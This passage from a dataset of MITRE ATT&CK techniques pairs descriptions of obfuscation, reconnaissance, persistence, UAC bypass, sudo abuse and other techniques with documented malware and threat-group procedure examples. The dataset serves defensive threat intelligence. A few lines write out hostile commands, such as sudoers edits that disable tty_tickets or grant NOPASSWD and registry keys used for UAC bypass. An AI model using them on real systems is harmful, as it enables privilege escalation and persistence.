Another variant is encoded with XOR.', '[FoggyWeb] has been XOR-encoded.', '[APT19] used Base64 to obfuscate payloads.', '[StrongPity] has used encrypted strings in its dropper component.', '[Fox Kitten] has base64 encoded payloads to avoid detection.', '[Bisonal] DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.', 'A [Threat Group-3390] tool can encrypt payloads using XOR. [Threat Group-3390] malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.', 'A [RedLeaves] configuration file is encrypted with a simple XOR key, 0x53.', '[FlawedGrace] encrypts its C2 configuration files with AES in CBC mode.', '[More_eggs] payload has been encrypted with a key that has the hostname and processor family information appended to the end.', '[Elise] encrypts several of its files, including configuration files.', '[Avenger] has the ability to XOR encrypt files to be sent to C2.', '[EnvyScout] can Base64 encode payloads.', 'Configuration data used by [Rising Sun] has been encrypted using an RC4 stream algorithm.\t', '[Mispadu] uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys.  [Mispadu] also uses encoded configuration files and has encoded payloads using Base64.', '[Dacls] can encrypt its configuration file with AES CBC.', '[njRAT] has included a base64 encoded executable.', ' [TA2541] has used compressed and char-encoded scripts in operations. ', '[PS1] is distributed as a set of encrypted files and scripts.', 'In one version of [KeyBoy] string obfuscation routines were used to hide many of the critical values referenced in the malware.', '[RainyDay] has downloaded as a XOR-encrypted payload.', '[Sliver] can encrypt strings at compile time.', '[Waterbear] has used RC4 encrypted shellcode and encrypted functions.', '[Malteiro] has used scripts encoded in Base64 certificates to distribute malware to victims.', '[Winnti for Linux] can encode its configuration file with single-byte XOR encoding.', '[Magic Hound] malware has used base64-encoded files and has also encrypted embedded strings with AES.', '[Seasalt] obfuscates configuration data.', '[StoneDrill] has obfuscated its module with an alphabet-based table or XOR encryption.', '[IcedID] has utilzed encrypted binaries and base64 encoded strings.', '[Blue Mockingbird] has obfuscated the wallet address in the payload binary.', '[Tropic Trooper] has encrypted configuration files.', '[SysUpdate] can encrypt and encode its configuration file.', '[Chrommme] can encrypt sections of its code to evade detection.', 'Strings in [Attor] components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.', '[REvil] has used encrypted strings and configuration files.', '[Mofang] has compressed the [ShimRat] executable within malicious email attachments. [Mofang] has also encrypted payloads before they are downloaded to victims.', 'Some strings in [HOMEFRY] are obfuscated with XOR x56.', '[Smoke Loader] uses a simple one-byte XOR method to obfuscate values in the malware.', '[Aria-body] has used an encrypted configuration file for its loader.', '[Mosquito] installer is obfuscated with a custom crypter to obfuscate the installer.', 'The payload of [CozyCar] is encrypted with simple XOR with a rotating key. The [CozyCar] configuration file has been encrypted with RC4 keys.', '[YAHOYAH] encrypts its configuration file using a simple algorithm.', '[ThreatNeedle] has been compressed and obfuscated using RC4, AES, or XOR.', '[BADHATCH] can be compressed with the ApLib algorithm.', '[Whitefly] has encrypted the payload used for C2.\t', '[menuPass] has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.', '[BendyBear] has encrypted payloads using RC4 and XOR.', '[PyDCrypt] has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.', '[VERMIN] is obfuscated using the obfuscation tool called ConfuserEx.', '[HermeticWiper] can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.', '[Micropsia] obfuscates the configuration with a custom Base64 and XOR.', 'During [Operation Dust Storm] the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.', '[Kevin] has Base64-encoded its configuration file.', '[Moses Staff] has used obfuscated web shells in their operations.', '[TeamTNT] has encrypted its binaries via AES and encoded files using Base64.', 'Many strings in [JHUHUGIT] are obfuscated with a XOR algorithm.', '[GoldMax] has written AES-encrypted and Base64-encoded configuration files to disk.', '[Chinoxy] has encrypted its configuration file.', '[DOGCALL] is encrypted using single-byte XOR.', '[RCSession] can compress and obfuscate its strings to evade detection on a compromised host.', '[Heyoka Backdoor] can encrypt its payload.', '[Metador] has encrypted their payloads.', 'The [FIVEHANDS] payload is encrypted with AES-128.', '[Zeus Panda] encrypts strings with XOR. [Zeus Panda] also encrypts all configuration and settings in AES and RC4.', '[Squirrelwaffle] has been obfuscated with a XOR-based algorithm.', '[HyperBro] can be delivered encrypted to a compromised host.', '[STARWHALE] has been obfuscated with hex-encoded strings.', '[HotCroissant] has encrypted strings with single-byte XOR and base64 encoded RC4.', '[Group5] disguised its malicious binaries with several layers of obfuscation, including encrypting the files.', 'During [Operation Dream Job] [Lazarus Group] encrypted malware such as  [DRATzarus] with XOR and DLL files with base64.', '[KGH_SPY] has used encrypted strings in its installer.', '[SUPERNOVA] contained Base64-encoded strings.', '[Carberp] has used XOR-based encryption to mask C2 server locations within the trojan.', 'Droppers used by [Putter Panda] use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.', '[SpeakUp] encodes its second-stage payload with Base64. ', '[OilRig] has encrypted and encoded data in its malware, including by using base64.', '[Mafalda] has been obfuscated and contains encrypted functions.', '[Hi-Zor] uses various XOR techniques to obfuscate its components.', '[HiddenWasp] encrypts its configuration and payload.', '[GoldenSpy] uninstaller has base64-encoded its variables. ', '[Taidoor] can use encrypted string blocks for obfuscation.', 'The [WastedLocker] payload includes encrypted strings stored within the .bss section of the binary file.   ', 'For [Operation Spalax] the threat actors used XOR-encrypted payloads.', '[Winnti for Windows] has the ability to encrypt and compress its payload.', '[Exaramel for Linux] uses RC4 for encrypting the configuration.', '[APT32] has performed code obfuscation, including encoding payloads using Base64 and using a framework called ""Dont-Kill-My-Cat (DKMC). [APT32] also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.', '[HermeticWizard] has the ability to encrypt PE files with a reverse XOR loop.', '[Gazer] logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.', 'During [Cutting Edge] threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure `dsls` binary.', '[Hildegard] has encrypted an ELF file.', '[Gelsemium] has the ability to compress its components.', 'A [Volgmer] variant is encoded using a simple XOR cipher.', '[IronNetInjector] can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.', '[TrickBot] uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.', '[RAPIDPULSE] has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.', '[Uroburos] can use AES and CAST-128 encryption to obfuscate resources.', '[FunnyDream] can Base64 encode its C2 address stored in a template binary with the `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-` or `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=` character sets.', '[AuditCred] encrypts the configuration.', '[Penquin] has encrypted strings in the binary for obfuscation.', '[GreyEnergy] encrypts its configuration files with AES-256 and also encrypts its strings.', '[CARROTBAT] has the ability to download a base64 encoded payload.', '[ZeroT] has encrypted its payload with RC4.', '[Cardinal RAT] encodes many of its artifacts and is encrypted (AES-128) when downloaded. ']",False
T1590.005,IP Addresses,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services]","['[Andariel] has limited its watering hole attacks to specific IP address ranges.', '[Magic Hound] has captured the IP addresses of visitors to their phishing sites.', '[HAFNIUM] has obtained IP addresses for publicly-accessible Exchange servers.']",
T1499.001,OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.  Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.  ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",[],False
T1546.013,PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell] starts and can be used as a logon script to customize user environments.  [PowerShell] supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell] host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.    Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell] drives to gain persistence. Every time a user opens a [PowerShell] session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.    An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. ",['[Turla] has used PowerShell profiles to maintain persistence on an infected machine.'],False
T1059.007,JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.  JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model] and Internet Explorer HTML Application (HTA) pages.  JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript] Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.  Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise] or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information]","['[AppleSeed] has the ability to use JavaScript to execute PowerShell.', 'The [Cobalt Strike] System Profiler can use JavaScript to perform reconnaissance actions.', '[Metamorfo] includes payloads written in JavaScript. ', '[Turla] has used various JavaScript-based backdoors.\t', '[APT32] has used JavaScript for drive-by downloads and C2 communications.', ""[NanHaiShu] executes additional Jscript code on the victim's machine."", '[FIN6] has used malicious JavaScript to steal payment card data from e-commerce sites.', '[Sidewinder] has used JavaScript to drop and execute malware loaders.', 'The [QakBot] web inject module can inject Java Script into web banking pages visited by the victim.', '[MoustachedBouncer] has used JavaScript to deliver malware hosted on HTML pages.', '[Avaddon] has been executed through a malicious JScript downloader.', '[MuddyWater] has used JavaScript files to execute its [POWERSTATS] payload.', '[Earth Lusca] has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.', '[GRIFFON] is written in and executed as [JavaScript]\t', '[Silence] has used JS scripts.', '[LazyScripter] has used JavaScript in its attacks. ', 'The [SocGholish] payload is executed as JavaScript.', '[EnvyScout] can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.', '[Valak] can execute JavaScript containing configuration data for establishing persistence.', '[TA505] has used JavaScript for code execution.', '[InvisiMole] can use a JavaScript file as part of its execution chain.', '[Astaroth] uses JavaScript to perform its core functionalities. ', ""[FIN7] used JavaScript scripts to help perform tasks on the victim's machine."", '[JSS Loader] can download and execute JavaScript files.', 'During [C0017] [APT41] deployed JScript web shells on compromised systems. ', '[WARPWIRE] is a credential harvester written in JavaScript.', '[Donut] can generate shellcode outputs that execute via JavaScript or JScript.\t', '[Xbash] can execute malicious JavaScript payloads on the victim’s machine.', ""[Cobalt Group] has executed JavaScript scriptlets on the victim's machine."", '[Higaisa] used JavaScript to execute additional files.', '[Kimsuky] has used JScript for logging and downloading additional tools.', ""[Ember Bear] has used JavaScript to execute malicious code on a victim's machine."", '[jRAT] has been distributed as HTA files with JScript.\t', '[SpicyOmelette] has the ability to execute arbitrary JavaScript code on a compromised host.', '[Indrik Spider] has used malicious JavaScript files for several components of their attack.', '[POWERSTATS] can use JavaScript code for execution.', '[Molerats] used various implants, including those built with JS, on target machines.\t', '[Chaes] has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.', '[Leafminer] infected victims using JavaScript code.', 'During [Operation Dust Storm] the threat actors used JavaScript code.', ""[Bundlore] can execute JavaScript by injecting it into the victim's browser."", ""[Evilnum] has used malicious JavaScript files on the victim's machine."", '[KONNI] has executed malicious JavaScript code. ', 'During [C0015] the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.', '[KOPILUWAK] had used Javascript to perform its core functions. ', '[DarkWatchman] uses JavaScript to perform its core functionalities.']",
T1590.002,DNS,"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.  Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS] DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases] [Search Open Websites/Domains] or [Active Scanning] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services]",[],False
T1546.006,LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.  Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",[],False
T1053.007,Container Orchestration Job,"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.  In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.",[],False
T1568.002,Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.  DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.  Adversaries may use DGAs for the purpose of [Fallback Channels] When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.","['[Aria-body] has the ability to use a DGA for C2 communications.', '[QakBot] can use domain generation algorithms in C2 communication.', '[Doki] has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.', '[MiniDuke] can use DGA to generate new Twitter URLs for C2.', '[POSHSPY] uses a DGA to derive command and control URLs from a word list.', '[DarkWatchman] has used a DGA to generate a domain name for C2.', '[BONDUPDATER] uses a DGA to communicate with command and control servers.', '[APT41] has used DGAs to change their C2 servers monthly.', '[TA551] has used a DGA to generate URLs from executed macros.', '[Conficker] has used a DGA that seeds with the current UTC victim system date to generate domains.', '[CHOPSTICK] can use a DGA for [Fallback Channels] domains are generated by concatenating words from lists.', '[ngrok] can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.', '[Ursnif] has used a DGA to generate domain names for C2.', '[Milan] can use hardcoded domains as an input for domain generation algorithms.', '[SombRAT] can use a custom DGA to generate a subdomain for C2.', '[CCBkdr] can use a DGA for [Fallback Channels] if communications with the primary command and control server are lost.', '[Grandoreiro] can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.', '[ShadowPad] uses a DGA that is based on the day of the month for C2 servers.', '[Astaroth] has used a DGA in C2 communications.', '[Bazar] can implement DGA using the current date as a seed variable.', '[Shark] can send DNS C2 communications using a unique domain generation algorithm.', '[Ebury] has used a DGA to generate a domain name for C2.', '[Ngrok] can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.']",
T1036.007,Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.   Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access] into a user’s system via [Spearphishing Attachment] then [User Execution] For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.  Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.","['[DarkGate] masquerades malicious LNK files as PDF objects using the double extension <code>.pdf.lnk</code>.', 'The [Bazar] loader has used dual-extension executable files such as PreviewReport.DOC.exe.', '[Mustang Panda] has used an additional filename extension to hide the true file type.', '[Milan] has used an executable named `companycatalog.exe.config` to appear benign.']",
T1548.002,Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.  If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model] objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32] to load a specifically crafted DLL which loads an auto-elevated [Component Object Model] object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.  Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:  * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.  Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.","['[BlackEnergy] attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.', '[RTM] can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.', '[Cobalt Strike] can use a number of known techniques to bypass Windows UAC.', '[Gelsemium] can bypass UAC to elevate process privileges on a compromised host.', 'Many [ZeroT] samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.', '[Saint Bot] has attempted to bypass UAC using `fodhelper.exe` to escalate privileges.', '[DarkGate] uses two distinct User Account Control (UAC) bypass techniques to escalate privileges.', '[WarzoneRAT] can use `sdclt.exe` to bypass UAC in Windows 10 to escalate privileges; for older Windows versions [WarzoneRAT] can use the IFileOperation exploit to bypass the UAC module.', '[Pupy] can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.', '[PoshC2] can utilize multiple methods to bypass UAC.', '[KONNI] has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to “AlwaysNotify"".', '[Sakula] contains UAC bypass code for both 32- and 64-bit systems.', '[ShimRat] has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.', '[BlackCat] can bypass UAC to escalate privileges. ', '[Evilnum] has used PowerShell to bypass UAC.', '[APT37] has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.', '[BRONZE BUTLER] has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.', '[AutoIt backdoor] attempts to escalate privileges by bypassing User Access Control.', '[FinFisher] performs UAC bypass.', '[Bad Rabbit] has attempted to bypass UAC and gain elevated administrative privileges.', '[Downdelph] bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.', '[Koadic] has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.', '[Avaddon] bypasses UAC using the CMSTPLUA COM interface. ', ' [QuasarRAT] can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.', '[Winnti for Windows] can use a variant of the sysprep UAC bypass.', '[WastedLocker] can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.', '[MuddyWater] uses various techniques to bypass UAC.', '[PipeMon] installer can use UAC bypass techniques to install the payload.', ' [Lokibot] has utilized multiple techniques to bypass UAC.', '[H1N1] bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).', '[Cobalt Group] has bypassed UAC.', 'An older variant of [PLAINTEE] performs UAC bypass.', '[Remcos] has a command for UAC bypassing.', '[Ramsay] can use [UACMe] for privilege escalation.\t', '[BitPaymer] can suppress UAC prompts by setting the <code>HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</code> registry key on Windows 10 or <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> on Windows 7 and launching the <code>eventvwr.msc</code> process, which launches [BitPaymer] with elevated privileges.', '[Earth Lusca] has used the Fodhelper UAC bypass technique to gain elevated privileges.', 'During [Operation Honeybee] the threat actors used the malicious NTWDBLIB.DLL and `cliconfig.exe` to bypass UAC protections.', '[CSPY Downloader] can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.', '[Bumblebee] has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.', 'A [Threat Group-3390] tool can use a public UAC bypass method to elevate privileges.', '[Grandoreiro] can bypass UAC by registering as the default handler for .MSC files.', '[Clambling] has the ability to bypass UAC using a `passuac.dll` file.', '[Shamoon] attempts to disable UAC remote restrictions by modifying the Registry.', ""[SILENTTRINITY] contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the `.msc` file extension.   "", '[AppleJeus] has presented the user with a UAC prompt to elevate privileges while installing.', '[InvisiMole] can use fileless UAC bypass and create an elevated COM object to escalate privileges.', '[KOCTOPUS] will perform UAC bypass either through fodhelper.exe or eventvwr.exe.', '[Patchwork] bypassed User Access Control (UAC).', '[BADHATCH] can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC. ', '[UACMe] contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.', '[Empire] includes various modules to attempt to bypass UAC for escalation of privileges.', '[RCSession] can bypass UAC to escalate privileges.', '[APT29] has bypassed UAC.', '[Honeybee] uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.', '[Cobalt Strike] can use a number of known techniques to bypass Windows UAC.']",False
T1016.001,Internet Connection Discovery,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping] <code>tracert</code>, and GET requests to websites.  Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.","['[GoldFinder] performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.', '[More_eggs] has used HTTP GET requests to check internet connectivity.', '[Neoichor] can check for Internet connectivity by contacting bing[.]com with the request format `bing[.]com?id=<GetTickCount>`.', 'During the [SolarWinds Compromise] [APT29] used [GoldFinder] to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.', '[Magic Hound] has conducted a network call out to a specific website as part of their initial discovery activity. ', '[SUGARUSH] has checked for internet connectivity from an infected host before attempting to establish a new TCP connection.', ""[NKAbuse] utilizes external services such as <code>ifconfig.me</code> to identify the victim machine's IP address."", '[HEXANE] has used tools including [BITSAdmin] to test internet connectivity from compromised hosts.', '[QakBot] can measure the download speed on a targeted host.', '[APT29] has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.', '[QuietSieve] can check C2 connectivity with a `ping` to 8.8.8.8 (Google public DNS).', '[Gamaredon Group] has tested connectivity between a compromised machine and a C2 server using  [Ping] with commands such as `CSIDL_SYSTEM\\cmd.exe /c ping -n 1`.', '[SysUpdate] can contact the DNS server operated by Google as part of its C2 establishment process. ', ' [TA2541] has run scripts to check internet connectivity from compromised hosts.  ', 'During [Operation Wocao] threat actors used a Visual Basic script that checked for internet connectivity.', '[DarkTortilla] can check for internet connectivity by issuing HTTP GET requests.', '[Woody RAT] can make `Ping` GET HTTP requests to its C2 server at regular intervals for network connectivity checks.', '[FIN13] has used `Ping` and `tracert` for network reconnaissance efforts.', '[Rising Sun] can test a connection to a specified network IP address over a specified port number.', '[HAFNIUM] has checked for network connectivity from a compromised host using `ping`, including attempts to contact `google[.]com`.', '[Turla] has used <code>tracert</code> to check internet connectivity.', '[FIN8] has used the [Ping] command to check connectivity to actor-controlled C2 servers. ', '[UNC2452] has used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.', '[APT29] has used [GoldFinder] to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.']",
T1548.003,Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.  Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."" Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).  The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>. Elevated privileges are required to edit this file though.  Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.  In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>. In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.","['[Cobalt Strike] can use <code>sudo</code> to run a command.', '[Proton] modifies the tty_tickets line in the sudoers file.', '[Dok] adds <code>admin  ALL=(ALL) NOPASSWD: ALL</code> to the <code>/etc/sudoers</code> file.']",
T1560.003,Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.","['[Attor] encrypts collected data with a custom implementation of Blowfish and RSA ciphers.', '[BLUELIGHT] has encoded data into a binary blob using XOR.', '[FIN6] has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.', 'Modules can be pushed to and executed by [Duqu] that copy data to a staging area, compress it, and XOR encrypt it.', '[Stuxnet] encrypts exfiltrated data via C2 with static 31-byte long XOR keys.', ""Data [SPACESHIP] copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23."", '[CopyKittens] encrypts data with a substitute cipher prior to exfiltration.', '[FoggyWeb] can use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also, [FoggyWeb] can encode C2 command output within a legitimate WebP file.', '[NETWIRE] has used a 